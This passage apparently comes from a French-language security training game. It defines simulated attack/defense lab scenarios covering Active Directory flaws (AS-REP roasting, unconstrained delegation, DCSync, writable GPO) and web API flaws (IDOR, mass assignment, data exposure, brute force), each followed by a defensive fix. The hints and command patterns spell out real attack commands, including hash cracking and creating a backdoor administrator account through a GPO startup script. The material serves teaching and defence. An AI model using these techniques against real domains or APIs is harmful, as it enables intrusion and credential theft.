    { pattern:/^asrep-roast\s+svc-backup$/, run(state, print){
        const vuln = /"doesNotRequirePreAuth":\s*true/.test(state.vfs['/etc/ad/users/svc-backup.json'].content);
        if(!vuln){ print('[Kerberos] KRB5KDC_ERR_PREAUTH_REQUIRED — pré-authentification requise.', 'err'); return; }
        state.flags = state.flags || {};
        state.flags.hashDumped = true;
        print('[+] Ticket AS-REP obtenu pour svc-backup, sans authentification préalable.', 'ok');
        print('$krb5asrep$23$svc-backup@LAB.LOCAL:8f2c1a...(hash tronqué)', 'out');
        print('[+] Hash sauvegardé dans svc-backup.asrep', 'ok');
      }
    },
    { pattern:/^hashcat\s+--mode\s+18200\s+svc-backup\.asrep\s+rockyou\.txt$/, run(state, print){
        if(!state.flags || !state.flags.hashDumped){ print('hashcat: fichier svc-backup.asrep introuvable — récupérez d\'abord le hash.', 'err'); return; }
        state.flags.cracked = true;
        print('$krb5asrep$23$svc-backup@LAB.LOCAL:8f2c1a...:Sauvegarde2023!', 'ok');
        print('[+] Mot de passe cassé : Sauvegarde2023!', 'ok');
      }
    },
    { pattern:/^net\s+use\s+\\\\dc01\\C\$\s+\/user:svc-backup\s+Sauvegarde2023!$/, run(state, print){
        if(!state.flags || !state.flags.cracked){ print('net use : mot de passe incorrect ou inconnu.', 'err'); return; }
        state.flags.persisted = true;
        print('La commande s\'est terminée correctement.', 'ok');
        print('[+] Accès administrateur local sur dc01 obtenu via le compte svc-backup.', 'ok');
        print("FLAG{asrep_roasting_svc_backup_admin_dc}", 'flagline');
      }
    }
  ],
  attackCheck(state){ return state.flags && state.flags.persisted === true; },
  defenseCheck(state){ return /"doesNotRequirePreAuth":\s*false/.test(state.vfs['/etc/ad/users/svc-backup.json'].content); },
  replay(state){
    const log=[];
    const vuln = /"doesNotRequirePreAuth":\s*true/.test(state.vfs['/etc/ad/users/svc-backup.json'].content);
    log.push({t:'$ asrep-roast svc-backup', cls:'prompt-line'});
    if(!vuln){
      log.push({t:'[Kerberos] KRB5KDC_ERR_PREAUTH_REQUIRED — pré-authentification requise.', cls:'err'});
      log.push({t:"[-] La pré-authentification est désormais exigée : la faille est corrigée.", cls:'err'});
      return {log, success:false};
    }
    log.push({t:'[+] Ticket AS-REP obtenu pour svc-backup, sans authentification préalable.', cls:'ok'});
    log.push({t:'[+] Hash cassable hors-ligne récupéré, accès administrateur sur dc01 obtenu.', cls:'ok'});
    return {log, success:true};
  }
},

/* ===================== 37. Délégation Kerberos sans contrainte (Active Directory) ===================== */
{
  id:'ad-unconstrained-delegation',
  title:'Un compte machine en délégation Kerberos sans contrainte',
  category:'Active Directory (délégation sans contrainte)',
  attack:{
    who:'Vous incarnez bob, qui vient d\'obtenir un accès administrateur local sur le serveur `print01`, un serveur d\'impression du domaine.',
    desc:"Le compte machine `PRINT01$` est configuré en délégation Kerberos « sans contrainte », ce qui signifie que tout ticket Kerberos d'un utilisateur qui s'y connecte est mis en cache localement, réutilisable tel quel. Provoquez la connexion d'un administrateur du domaine sur ce serveur, puis réutilisez son ticket mis en cache pour usurper son identité.",
    hints:[
      "`cat /etc/ad/computers/print01.json` confirme que `PRINT01$` a l'attribut `unconstrainedDelegation` activé.",
      "`printbug dc01 print01` simule l'abus du service Print Spooler pour forcer le contrôleur de domaine (donc un compte administrateur) à s'authentifier sur `print01`.",
      "`klist` liste les tickets Kerberos désormais mis en cache sur `print01`, y compris celui de l'administrateur du domaine qui vient de se connecter.",
      "`inject-ticket DC01$@LAB.LOCAL` réutilise ce ticket mis en cache pour usurper l'identité du contrôleur de domaine et obtenir un accès complet au domaine."
    ]
  },
  defense:{
    who:'Vous incarnez désormais l\'administrateur du domaine chargé de corriger la faille.',
    desc:"Désactivez la délégation sans contrainte sur le compte machine `PRINT01$` — un serveur d'impression n'a aucune raison de pouvoir rejouer les tickets Kerberos des utilisateurs qui s'y connectent.",
    hints:[
      "Éditez `/etc/ad/computers/print01.json` avec `nano` et remplacez `\"unconstrainedDelegation\": true` par `\"unconstrainedDelegation\": false`.",
      "`verify` confirme que la délégation sans contrainte est désactivée."
    ]
  },
  makeVfs(){
    return {
      '/':{type:'dir',perm:'755',owner:'root',children:['home','etc']},
      '/home':{type:'dir',perm:'755',owner:'root',children:['bob']},
      '/home/bob':{type:'dir',perm:'755',owner:'bob',children:[]},
      '/etc':{type:'dir',perm:'755',owner:'root',children:['ad']},
      '/etc/ad':{type:'dir',perm:'755',owner:'root',children:['computers']},
      '/etc/ad/computers':{type:'dir',perm:'755',owner:'root',children:['print01.json']},
      '/etc/ad/computers/print01.json':{type:'file',perm:'644',owner:'root',size:110,
        content:"{\n  \"sAMAccountName\": \"PRINT01$\",\n  \"role\": \"serveur d'impression\",\n  \"unconstrainedDelegation\": true\n}\n"}
    };
  },
  startUserAttack:'bob', startCwdAttack:'/home/bob',
  exploitRules:[
    { pattern:/^printbug\s+dc01\s+print01$/, run(state, print){
        const vuln = /"unconstrainedDelegation":\s*true/.test(state.vfs['/etc/ad/computers/print01.json'].content);
        if(!vuln){ print('[spooler] print01 ne met plus les tickets en cache — abus sans effet.', 'err'); return; }
        state.flags = state.flags || {};
        state.flags.coerced = true;
        print('[spooler] dc01 authentifié de force sur print01 (abus du service Print Spooler).', 'ok');
        print('[+] Ticket Kerberos de DC01$ mis en cache sur print01.', 'ok');
      }
    },
    { pattern:/^klist$/, run(state, print){
        if(!state.flags || !state.flags.coerced){ print('Cache de tickets actuel :\n  (aucun ticket administrateur)', 'out'); return; }
        state.flags.listed = true;
        print('Cache de tickets actuel :', 'out');
        print('  Client: DC01$ @ LAB.LOCAL   Serveur: krbtgt/LAB.LOCAL', 'out');
      }
    },
    { pattern:/^inject-ticket\s+DC01\$@LAB\.LOCAL$/, run(state, print){
        const vuln = /"unconstrainedDelegation":\s*true/.test(state.vfs['/etc/ad/computers/print01.json'].content);
        if(!vuln){ print('inject-ticket : aucun ticket mis en cache à réutiliser.', 'err'); return; }
        if(!state.flags || !state.flags.listed){ print('inject-ticket : listez d\'abord le cache avec klist.', 'err'); return; }
        state.flags.persisted = true;
        print('[+] Identité DC01$ (contrôleur de domaine) usurpée avec succès.', 'ok');
        print("FLAG{delegation_sans_contrainte_usurpation_dc}", 'flagline');
      }
    }
  ],
  attackCheck(state){ return state.flags && state.flags.persisted === true; },
  defenseCheck(state){ return /"unconstrainedDelegation":\s*false/.test(state.vfs['/etc/ad/computers/print01.json'].content); },
  replay(state){
    const log=[];
    const vuln = /"unconstrainedDelegation":\s*true/.test(state.vfs['/etc/ad/computers/print01.json'].content);
    log.push({t:'$ printbug dc01 print01', cls:'prompt-line'});
    if(!vuln){
      log.push({t:'[spooler] print01 ne met plus les tickets en cache — abus sans effet.', cls:'err'});
      log.push({t:"[-] La délégation sans contrainte est désactivée : la faille est corrigée.", cls:'err'});
      return {log, success:false};
    }
    log.push({t:'[+] Ticket Kerberos de DC01$ mis en cache sur print01.', cls:'ok'});
    log.push({t:'[+] Identité du contrôleur de domaine usurpée via le ticket mis en cache.', cls:'ok'});
    return {log, success:true};
  }
},

/* ===================== 38. Droits de réplication AD excessifs (DCSync) ===================== */
{
  id:'ad-dcsync-abuse',
  title:'Un compte de service disposant à tort des droits de réplication du domaine (DCSync)',
  category:'Active Directory (abus DCSync)',
  attack:{
    who:'Vous incarnez bob, qui a compromis le compte de service `svc-monitor` (identifiants trouvés dans un script de supervision).',
    desc:"Le compte `svc-monitor` s'est vu accorder par erreur les droits « Replicating Directory Changes » et « Replicating Directory Changes All » sur le domaine — des droits normalement réservés aux contrôleurs de domaine. Utilisez ces droits pour simuler une réplication et extraire les identifiants de tous les comptes du domaine, y compris `krbtgt`.",
    hints:[
      "`net user svc-monitor /domain` confirme l'identité du compte et rappelle son usage prévu (supervision, aucun besoin de réplication).",
      "`dcsync-check svc-monitor` interroge les droits de réplication ACL du domaine associés au compte : le résultat révèle les deux droits accordés à tort.",
      "`dcsync krbtgt` simule une demande de réplication ciblée sur le compte `krbtgt`, dont le hash permet ensuite de forger des tickets Kerberos valides pour n'importe quel utilisateur du domaine (Golden Ticket)."
    ]
  },
  defense:{
    who:'Vous incarnez désormais l\'administrateur du domaine chargé de corriger la faille.',
    desc:"Retirez les droits de réplication accordés à tort au compte `svc-monitor` — un compte de supervision n'a besoin d'aucun droit de réplication du domaine.",
    hints:[
      "Éditez `/etc/ad/acl/svc-monitor-replication.json` avec `nano` et remplacez `\"replicationRights\": true` par `\"replicationRights\": false`.",
      "`verify` confirme que le compte n'a plus aucun droit de réplication."
    ]
  },
  makeVfs(){
    return {
      '/':{type:'dir',perm:'755',owner:'root',children:['home','etc']},
      '/home':{type:'dir',perm:'755',owner:'root',children:['bob']},
      '/home/bob':{type:'dir',perm:'755',owner:'bob',children:[]},
      '/etc':{type:'dir',perm:'755',owner:'root',children:['ad']},
      '/etc/ad':{type:'dir',perm:'755',owner:'root',children:['acl']},
      '/etc/ad/acl':{type:'dir',perm:'755',owner:'root',children:['svc-monitor-replication.json']},
      '/etc/ad/acl/svc-monitor-replication.json':{type:'file',perm:'644',owner:'root',size:120,
        content:"{\n  \"account\": \"svc-monitor\",\n  \"intendedUse\": \"supervision applicative\",\n  \"replicationRights\": true\n}\n"}
    };
  },
  startUserAttack:'bob', startCwdAttack:'/home/bob',
  exploitRules:[
    { pattern:/^net\s+user\s+svc-monitor\s+\/domain$/, run(state, print){
        print('Nom du compte     svc-monitor', 'out');
        print('Usage prévu       Supervision applicative (lecture seule)', 'out');
      }
    },
    { pattern:/^dcsync-check\s+svc-monitor$/, run(state, print){
        const over = /"replicationRights":\s*true/.test(state.vfs['/etc/ad/acl/svc-monitor-replication.json'].content);
        if(over){
          state.flags = state.flags || {};
          state.flags.checked = true;
          print('Droits ACL délégués à svc-monitor sur le domaine :', 'out');
          print('  - Replicating Directory Changes', 'out');
          print('  - Replicating Directory Changes All', 'out');
        } else {
          print('Aucun droit de réplication délégué à svc-monitor.', 'out');
        }
      }
    },
    { pattern:/^dcsync\s+krbtgt$/, run(state, print){
        const over = /"replicationRights":\s*true/.test(state.vfs['/etc/ad/acl/svc-monitor-replication.json'].content);
        if(!over){ print('[DRSUAPI] DRS_ERROR_ACCESS_DENIED — droits de réplication insuffisants.', 'err'); return; }
        if(!state.flags || !state.flags.checked){ print('dcsync: vérifiez d\'abord les droits disponibles avec dcsync-check.', 'err'); return; }
        state.flags.dumped = true;
        print('[DRSUAPI] Réplication simulée acceptée (droits Replicating Directory Changes All).', 'ok');
        print('krbtgt:502:aad3b435b51404eeaad3b435b51404ee:7a8f2c1e9b3d4f5a6c7e8f9a0b1c2d3e:::', 'ok');
        print("[+] Hash NTLM de krbtgt extrait — falsification de tickets (Golden Ticket) désormais possible.", 'ok');
        print("FLAG{dcsync_replication_rights_krbtgt_hash}", 'flagline');
      }
    }
  ],
  attackCheck(state){ return state.flags && state.flags.dumped === true; },
  defenseCheck(state){ return /"replicationRights":\s*false/.test(state.vfs['/etc/ad/acl/svc-monitor-replication.json'].content); },
  replay(state){
    const log=[];
    const over = /"replicationRights":\s*true/.test(state.vfs['/etc/ad/acl/svc-monitor-replication.json'].content);
    log.push({t:'$ dcsync krbtgt', cls:'prompt-line'});
    if(!over){
      log.push({t:'[DRSUAPI] DRS_ERROR_ACCESS_DENIED — droits de réplication insuffisants.', cls:'err'});
      log.push({t:"[-] Les droits de réplication ont été retirés : la faille est corrigée.", cls:'err'});
      return {log, success:false};
    }
    log.push({t:'krbtgt:502:aad3b435b51404eeaad3b435b51404ee:7a8f2c1e9b3d4f5a6c7e8f9a0b1c2d3e:::', cls:'ok'});
    log.push({t:'[+] Hash NTLM de krbtgt extrait via une réplication de domaine abusive.', cls:'ok'});
    return {log, success:true};
  }
},

/* ===================== 39. GPO modifiable par un groupe sur-privilégié (Active Directory) ===================== */
{
  id:'ad-gpo-writable',
  title:'Une stratégie de groupe (GPO) modifiable par tous les utilisateurs du domaine',
  category:'Active Directory (GPO modifiable)',
  attack:{
    who:'Vous incarnez bob, un utilisateur standard du domaine.',
    desc:"La GPO « Déploiement-Postes » s'applique à l'unité d'organisation contenant les postes des administrateurs, mais son ACL autorise en écriture le groupe « Utilisateurs du domaine » au lieu du seul groupe « Admins du domaine ». Modifiez son script de démarrage pour y ajouter un compte administrateur local, qui sera créé sur chaque poste administrateur au prochain rafraîchissement de stratégie.",
    hints:[
      "`cat /etc/ad/gpo/deploiement-postes.json` montre l'ACL de la GPO : le groupe « Utilisateurs du domaine » y a le droit d'écriture, en plus des administrateurs.",
      "Éditez `/etc/ad/gpo/deploiement-postes-startup.ps1` avec `nano` et ajoutez une ligne créant un compte administrateur local, par exemple `net user backdoor P@ss123! /add` suivie de `net localgroup administrators backdoor /add`.",
      "`gpupdate /force` simule le rafraîchissement de la stratégie de groupe sur les postes administrateurs ciblés par cette GPO, exécutant votre script."
    ]
  },
  defense:{
    who:'Vous incarnez désormais l\'administrateur du domaine chargé de corriger la faille.',
    desc:"Corrigez l'ACL de la GPO pour que seul le groupe « Admins du domaine » puisse la modifier.",
    hints:[
      "Éditez `/etc/ad/gpo/deploiement-postes.json` avec `nano` et remplacez `\"Utilisateurs du domaine\"` par `\"Admins du domaine\"` dans la liste des groupes autorisés en écriture.",
      "`verify` confirme que seuls les administrateurs du domaine peuvent modifier cette GPO."
    ]
  },
  makeVfs(){
    return {
      '/':{type:'dir',perm:'755',owner:'root',children:['home','etc']},
      '/home':{type:'dir',perm:'755',owner:'root',children:['bob']},
      '/home/bob':{type:'dir',perm:'755',owner:'bob',children:[]},
      '/etc':{type:'dir',perm:'755',owner:'root',children:['ad']},
      '/etc/ad':{type:'dir',perm:'755',owner:'root',children:['gpo']},
      '/etc/ad/gpo':{type:'dir',perm:'755',owner:'root',children:['deploiement-postes.json','deploiement-postes-startup.ps1']},
      '/etc/ad/gpo/deploiement-postes.json':{type:'file',perm:'644',owner:'root',size:130,
        content:"{\n  \"name\": \"Déploiement-Postes\",\n  \"appliedTo\": \"OU=Postes-Admins,DC=lab,DC=local\",\n  \"writeGroups\": [\"Admins du domaine\", \"Utilisateurs du domaine\"]\n}\n"},
      '/etc/ad/gpo/deploiement-postes-startup.ps1':{type:'file',perm:'664',owner:'bob',size:60,
        content:"# Script de démarrage — Déploiement-Postes\nWrite-Host 'Poste initialisé'\n"}
    };
  },
  startUserAttack:'bob', startCwdAttack:'/home/bob',
  exploitRules:[
    { pattern:/^gpupdate\s+\/force$/, run(state, print){
        const acl = state.vfs['/etc/ad/gpo/deploiement-postes.json'].content;
        const over = /"Utilisateurs du domaine"/.test(acl);
        const script = state.vfs['/etc/ad/gpo/deploiement-postes-startup.ps1'].content;
        const payload = /net user backdoor .* \/add/.test(script) && /net localgroup administrators backdoor \/add/.test(script);
        if(!over){ print('[gpsvc] Déploiement-Postes appliquée (aucune modification non autorisée détectée).', 'info'); return; }
        if(!payload){ print("[gpsvc] Stratégie rafraîchie, script de démarrage exécuté sans modification suspecte — éditez d'abord le script.", 'err'); return; }
        state.flags = state.flags || {};
        state.flags.persisted = true;
        print('[gpsvc] Stratégie « Déploiement-Postes » rafraîchie sur les postes administrateurs.', 'info');
        print("[+] Script de démarrage exécuté : compte 'backdoor' créé et ajouté aux administrateurs locaux sur chaque poste administrateur.", 'ok');
        print("FLAG{gpo_acl_trop_large_backdoor_admin_postes}", 'flagline');
      }
    }
  ],
  attackCheck(state){ return state.flags && state.flags.persisted === true; },
  defenseCheck(state){ return !/"Utilisateurs du domaine"/.test(state.vfs['/etc/ad/gpo/deploiement-postes.json'].content); },
  replay(state){
    const log=[];
    const over = /"Utilisateurs du domaine"/.test(state.vfs['/etc/ad/gpo/deploiement-postes.json'].content);
    log.push({t:'$ gpupdate /force', cls:'prompt-line'});
    if(!over){
      log.push({t:'[gpsvc] Déploiement-Postes appliquée (aucune modification non autorisée détectée).', cls:'err'});
      log.push({t:"[-] L'ACL de la GPO ne permet plus l'écriture par tous les utilisateurs : la faille est corrigée.", cls:'err'});
      return {log, success:false};
    }
    log.push({t:"[+] Script de démarrage exécuté : compte 'backdoor' créé et ajouté aux administrateurs locaux.", cls:'ok'});
    return {log, success:true};
  }
},

/* ===================== 40. IDOR — référence directe non sécurisée à un objet ===================== */
{
  id:'idor-invoice-api',
  title:'Référence directe non sécurisée à un objet (IDOR) sur l\'API de facturation',
  category:'API web (IDOR / Broken Object Level Authorization)',
  attack:{
    who:'Vous incarnez bob, client authentifié sur l\'API de facturation de target-lab (identifiant client 1042).',
    desc:"L'API expose les factures par identifiant numérique séquentiel (`/invoices/<id>`) et ne vérifie jamais que la facture demandée appartient bien au client authentifié. Consultez votre propre facture, puis élargissez l'accès à celle d'un autre client pour en extraire des données sensibles.",
    hints:[
      "`curl http://api.target-lab/invoices/1042 -H 'Authorization: Bearer bob-token'` renvoie votre propre facture : le format d'URL est prévisible et purement numérique.",
      "Rien n'indique que l'identifiant 1042 vous soit réservé — essayez un identifiant client voisin, par exemple `curl http://api.target-lab/invoices/1001 -H 'Authorization: Bearer bob-token'`.",
      "Si l'API ne vérifie pas le propriétaire de la ressource demandée, elle renverra la facture d'un autre client — potentiellement le compte administrateur (identifiant 1001) — sans aucune erreur d'autorisation."
    ]
  },
  defense:{
    who:'Vous incarnez désormais l\'administrateur de l\'API chargé de corriger la faille.',
    desc:"Forcez la vérification que la facture demandée appartient bien au client authentifié, sans casser l'accès légitime de chaque client à ses propres factures.",
    hints:[
      "Éditez `/etc/api/invoices-config.yml` avec `nano` et passez `enforce_ownership` à `true`.",
      "`verify` confirme que le contrôle de propriété est désormais appliqué avant de renvoyer une facture."
    ]
  },
  makeVfs(){
    return {
      '/':{type:'dir',perm:'755',owner:'root',children:['home','etc']},
      '/home':{type:'dir',perm:'755',owner:'root',children:['bob']},
      '/home/bob':{type:'dir',perm:'755',owner:'bob',children:[]},
      '/etc':{type:'dir',perm:'755',owner:'root',children:['api']},
      '/etc/api':{type:'dir',perm:'755',owner:'root',children:['invoices-config.yml']},
      '/etc/api/invoices-config.yml':{type:'file',perm:'644',owner:'root',size:30,
        content:"enforce_ownership: false\n"}
    };
  },
  startUserAttack:'bob', startCwdAttack:'/home/bob',
  exploitRules:[
    { pattern:/^curl\s+http:\/\/api\.target-lab\/invoices\/1042\s+-H\s+'Authorization:\s+Bearer\s+bob-token'$/, run(state, print){
        print('{"invoice_id":1042,"owner":"bob","amount":"49.90€","items":["Abonnement mensuel"]}', 'out');
      }
    },
    { pattern:/^curl\s+http:\/\/api\.target-lab\/invoices\/1001\s+-H\s+'Authorization:\s+Bearer\s+bob-token'$/, run(state, print){
        const enforced = /enforce_ownership:\s*true/.test(state.vfs['/etc/api/invoices-config.yml'].content);
        if(enforced){ print('403 Forbidden: cette facture appartient à un autre client.', 'err'); return; }
        state.flags = state.flags || {};
        state.flags.leaked = true;
        print('{"invoice_id":1001,"owner":"admin","amount":"12400.00€","items":["Licence entreprise annuelle"],"note":"Code d\'accès coffre: 7734-ADMIN"}', 'out');
        print("[+] Facture d'un autre client obtenue sans aucune vérification de propriété (IDOR).", 'ok');
        print("FLAG{idor_invoice_api_ownership_check_absent}", 'flagline');
      }
    }
  ],
  attackCheck(state){ return state.flags && state.flags.leaked === true; },
  defenseCheck(state){ return /enforce_ownership:\s*true/.test(state.vfs['/etc/api/invoices-config.yml'].content); },
  replay(state){
    const log=[];
    const enforced = /enforce_ownership:\s*true/.test(state.vfs['/etc/api/invoices-config.yml'].content);
    log.push({t:"$ curl http://api.target-lab/invoices/1001 -H 'Authorization: Bearer bob-token'", cls:'prompt-line'});
    if(enforced){
      log.push({t:'403 Forbidden: cette facture appartient à un autre client.', cls:'err'});
      log.push({t:"[-] Le contrôle de propriété est désormais appliqué : la faille est corrigée.", cls:'err'});
      return {log, success:false};
    }
    log.push({t:'{"invoice_id":1001,"owner":"admin","amount":"12400.00€", ...}', cls:'ok'});
    log.push({t:"[+] Facture d'un autre client obtenue via IDOR.", cls:'ok'});
    return {log, success:true};
  }
},

/* ===================== 41. Affectation de masse (mass assignment) à l'inscription ===================== */
{
  id:'mass-assignment-signup',
  title:'Affectation de masse (mass assignment) lors de l\'inscription utilisateur',
  category:'API web (Mass Assignment)',
  attack:{
    who:'Vous incarnez eve, une visiteuse externe sans compte sur l\'application de target-lab.',
    desc:"Le point d'entrée d'inscription construit l'utilisateur directement à partir de l'intégralité du corps JSON envoyé, sans filtrer les champs autorisés. Inscrivez-vous en glissant un champ supplémentaire non prévu par le formulaire pour vous attribuer un rôle privilégié dès la création du compte.",
    hints:[
      "Le formulaire d'inscription officiel n'envoie que `username` et `password` — mais rien n'empêche d'envoyer des champs supplémentaires dans la requête brute.",
      "`curl -X POST http://api.target-lab/signup -H 'Content-Type: application/json' -d '{\"username\":\"eve\",\"password\":\"Passw0rd!\",\"role\":\"admin\"}'` glisse un champ `role` non prévu dans le corps de la requête.",
      "Si le serveur construit l'utilisateur à partir de l'objet JSON complet sans filtrer les champs autorisés, ce `role` sera accepté tel quel — vérifiez ensuite avec `curl http://api.target-lab/admin -H 'Authorization: Bearer eve-token'`."
    ]
  },
  defense:{
    who:'Vous incarnez désormais l\'administrateur applicatif chargé de corriger la faille.',
    desc:"Ne construisez plus jamais l'utilisateur depuis l'objet JSON complet reçu : n'acceptez explicitement que les champs prévus par le formulaire d'inscription.",
    hints:[
      "Éditez `/opt/api/signup.py` avec `nano` et remplacez la construction `User(**request.json)` par une construction explicite `User(username=request.json['username'], password=request.json['password'])`, sans jamais reprendre `role` depuis la requête.",
      "`verify` confirme que l'utilisateur n'est plus construit à partir de l'ensemble du corps JSON reçu."
    ]
  },
  makeVfs(){
    return {
      '/':{type:'dir',perm:'755',owner:'root',children:['home','opt']},
      '/home':{type:'dir',perm:'755',owner:'root',children:['eve']},
      '/home/eve':{type:'dir',perm:'755',owner:'eve',children:[]},
      '/opt':{type:'dir',perm:'755',owner:'root',children:['api']},
      '/opt/api':{type:'dir',perm:'755',owner:'root',children:['signup.py']},
      '/opt/api/signup.py':{type:'file',perm:'644',owner:'root',size:150,
        content:"from flask import request\nfrom models import User\n\ndef signup():\n    user = User(**request.json)\n    user.role = user.role or 'user'\n    user.save()\n    return {'created': user.username}\n"}
    };
  },
  startUserAttack:'eve', startCwdAttack:'/home/eve',
  exploitRules:[
    { pattern:/^curl\s+-X\s+POST\s+http:\/\/api\.target-lab\/signup\s+-H\s+'Content-Type:\s+application\/json'\s+-d\s+'\{"username":"eve","password":"Passw0rd!","role":"admin"\}'$/, run(state, print){
        const vulnerable = /User\(\*\*request\.json\)/.test(state.vfs['/opt/api/signup.py'].content);
        state.flags = state.flags || {};
        if(!vulnerable){
          print('{"created":"eve","role":"user"}', 'out');
          print("[i] Le champ role a été ignoré : seuls username et password ont été pris en compte.", 'info');
          return;
        }
        state.flags.signedUpAsAdmin = true;
        print('{"created":"eve","role":"admin"}', 'out');
        print("[i] Le champ role, absent du formulaire officiel, a été accepté tel quel (affectation de masse confirmée).", 'info');
      }
    },
    { pattern:/^curl\s+http:\/\/api\.target-lab\/admin\s+-H\s+'Authorization:\s+Bearer\s+eve-token'$/, run(state, print){
        if(!state.flags || !state.flags.signedUpAsAdmin){
          print('403 Forbidden: privilèges insuffisants.', 'err');
          return;
        }
        state.flags.adminAccess = true;
        print('{"panel":"admin","users":142,"pending_invoices":37}', 'out');
        print("[+] Accès administrateur obtenu dès l'inscription via affectation de masse (mass assignment).", 'ok');
        print("FLAG{mass_assignment_signup_role_non_filtre}", 'flagline');
      }
    }
  ],
  attackCheck(state){ return state.flags && state.flags.adminAccess === true; },
  defenseCheck(state){ return !/User\(\*\*request\.json\)/.test(state.vfs['/opt/api/signup.py'].content); },
  replay(state){
    const log=[];
    const vulnerable = /User\(\*\*request\.json\)/.test(state.vfs['/opt/api/signup.py'].content);
    log.push({t:"$ curl -X POST .../signup -d '{\"username\":\"eve\",\"password\":\"Passw0rd!\",\"role\":\"admin\"}'", cls:'prompt-line'});
    if(!vulnerable){
      log.push({t:'{"created":"eve","role":"user"}', cls:'err'});
      log.push({t:"[-] Le champ role n'est plus repris depuis la requête : la faille est corrigée.", cls:'err'});
      return {log, success:false};
    }
    log.push({t:'{"panel":"admin","users":142,"pending_invoices":37}', cls:'ok'});
    log.push({t:"[+] Accès administrateur obtenu dès l'inscription via mass assignment.", cls:'ok'});
    return {log, success:true};
  }
},

/* ===================== 42. Exposition excessive de données ===================== */
{
  id:'excessive-data-exposure-api',
  title:'Exposition excessive de données sur le point d\'entrée annuaire des utilisateurs',
  category:'API web (Excessive Data Exposure)',
  attack:{
    who:'Vous incarnez bob, utilisateur authentifié sur l\'API de target-lab.',
    desc:"Le point d'entrée `/users`, censé fournir un simple annuaire public (nom, identifiant), renvoie en réalité l'objet base de données complet de chaque utilisateur — y compris des champs sensibles jamais affichés par l'application officielle. Exploitez cette fuite pour usurper le compte administrateur.",
    hints:[
      "`curl http://api.target-lab/users -H 'Authorization: Bearer bob-token'` liste les utilisateurs : inspectez la réponse brute plutôt que de vous fier à ce qu'affiche l'interface web habituelle.",
      "L'entrée de l'administrateur contient un champ `password_reset_token` qui ne devrait jamais transiter dans une réponse d'annuaire public.",
      "Réutilisez ce jeton pour réinitialiser le mot de passe administrateur : `curl -X POST http://api.target-lab/reset-password -H 'Content-Type: application/json' -d '{\"token\":\"rt_9f2ab7c1\",\"new_password\":\"Hacked123!\"}'`",
      "Connectez-vous ensuite avec les nouveaux identifiants : `curl -u admin:Hacked123! http://api.target-lab/admin`"
    ]
  },
  defense:{
    who:'Vous incarnez désormais l\'administrateur de l\'API chargé de corriger la faille.',
    desc:"Limitez la réponse de l'annuaire aux seuls champs publics prévus, sans exposer l'objet base de données complet.",
    hints:[
      "Éditez `/etc/api/users-config.yml` avec `nano` et passez `expose_full_profile` à `false`.",
      "`verify` confirme que seuls les champs publics sont désormais renvoyés par l'annuaire."
    ]
  },
  makeVfs(){
    return {
      '/':{type:'dir',perm:'755',owner:'root',children:['home','etc']},
      '/home':{type:'dir',perm:'755',owner:'root',children:['bob']},
      '/home/bob':{type:'dir',perm:'755',owner:'bob',children:[]},
      '/etc':{type:'dir',perm:'755',owner:'root',children:['api']},
      '/etc/api':{type:'dir',perm:'755',owner:'root',children:['users-config.yml']},
      '/etc/api/users-config.yml':{type:'file',perm:'644',owner:'root',size:30,
        content:"expose_full_profile: true\n"}
    };
  },
  startUserAttack:'bob', startCwdAttack:'/home/bob',
  exploitRules:[
    { pattern:/^curl\s+http:\/\/api\.target-lab\/users\s+-H\s+'Authorization:\s+Bearer\s+bob-token'$/, run(state, print){
        const exposed = /expose_full_profile:\s*true/.test(state.vfs['/etc/api/users-config.yml'].content);
        if(!exposed){
          print('[{"id":1042,"name":"bob"},{"id":1,"name":"admin"}]', 'out');
          print("[i] Seuls les champs publics (id, name) sont renvoyés.", 'info');
          return;
        }
        state.flags = state.flags || {};
        state.flags.tokenLeaked = true;
        print('[{"id":1042,"name":"bob","password_hash":"$2b$...","password_reset_token":null},{"id":1,"name":"admin","password_hash":"$2b$...","password_reset_token":"rt_9f2ab7c1"}]', 'out');
        print("[i] Le champ password_reset_token de l'administrateur n'aurait jamais dû transiter dans cette réponse.", 'info');
      }
    },
    { pattern:/^curl\s+-X\s+POST\s+http:\/\/api\.target-lab\/reset-password\s+-H\s+'Content-Type:\s+application\/json'\s+-d\s+'\{"token":"rt_9f2ab7c1","new_password":"Hacked123!"\}'$/, run(state, print){
        if(!state.flags || !state.flags.tokenLeaked){
          print('400 Bad Request: jeton de réinitialisation invalide.', 'err');
          return;
        }
        state.flags.passwordReset = true;
        print('{"status":"password updated"}', 'out');
        print("[i] Mot de passe administrateur réinitialisé via le jeton exposé.", 'info');
      }
    },
    { pattern:/^curl\s+-u\s+admin:Hacked123!\s+http:\/\/api\.target-lab\/admin$/, run(state, print){
        if(!state.flags || !state.flags.passwordReset){
          print('401 Unauthorized: identifiants invalides.', 'err');
          return;
        }
        state.flags.adminAccess = true;
        print('{"panel":"admin","users":142,"pending_invoices":37}', 'out');
        print("[+] Accès administrateur obtenu via un jeton de réinitialisation exposé dans une réponse trop bavarde.", 'ok');
        print("FLAG{excessive_data_exposure_reset_token_leak}", 'flagline');
      }
    }
  ],
  attackCheck(state){ return state.flags && state.flags.adminAccess === true; },
  defenseCheck(state){ return !/expose_full_profile:\s*true/.test(state.vfs['/etc/api/users-config.yml'].content); },
  replay(state){
    const log=[];
    const exposed = /expose_full_profile:\s*true/.test(state.vfs['/etc/api/users-config.yml'].content);
    log.push({t:"$ curl http://api.target-lab/users -H 'Authorization: Bearer bob-token'", cls:'prompt-line'});
    if(!exposed){
      log.push({t:'[{"id":1042,"name":"bob"},{"id":1,"name":"admin"}]', cls:'err'});
      log.push({t:"[-] Seuls les champs publics sont désormais renvoyés : la faille est corrigée.", cls:'err'});
      return {log, success:false};
    }
    log.push({t:'[...,{"id":1,"name":"admin","password_reset_token":"rt_9f2ab7c1"}]', cls:'ok'});
    log.push({t:"[+] Accès administrateur obtenu via le jeton de réinitialisation exposé.", cls:'ok'});
    return {log, success:true};
  }
},

/* ===================== 43. Absence de limitation de débit (brute force) ===================== */
{
  id:'missing-rate-limit-bruteforce',
  title:'Absence de limitation de débit sur l\'authentification',
  category:'API web (Missing Rate Limiting / Brute Force)',
  attack:{
    who:'Vous incarnez eve, une attaquante externe sans identifiants valides sur l\'API de target-lab.',
    desc:"Le point d'entrée de connexion n'impose aucune limite de tentatives : aucun verrouillage de compte, aucun ralentissement, aucun CAPTCHA après échec. Exploitez cette absence de limitation de débit pour deviner par force brute le mot de passe administrateur, puis connectez-vous.",
    hints:[
      "`curl-bruteforce --user admin --wordlist common-passwords.txt --target http://api.target-lab/login` rejoue rapidement un dictionnaire de mots de passe courants contre le compte admin.",
